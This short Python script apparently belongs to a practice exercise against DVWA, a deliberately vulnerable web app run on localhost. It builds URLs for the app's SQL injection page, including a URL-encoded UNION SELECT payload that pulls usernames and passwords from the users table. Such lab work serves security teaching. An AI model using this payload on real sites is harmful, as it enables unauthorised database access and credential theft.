from urllib.parse import quote


REPLACE_STR = "*HERE*"

url = "http://localhost/DVWA/vulnerabilities/sqli/?id=*HERE*&Submit=Submit#"

regular_sqli = "1"
regular_sqli_url = url.replace(REPLACE_STR, quote(regular_sqli))
print(regular_sqli_url)

sqli_payload = "' UNION SELECT user, password FROM users#"
sqli_payload_url = url.replace(REPLACE_STR, quote(sqli_payload))
print(sqli_payload_url)

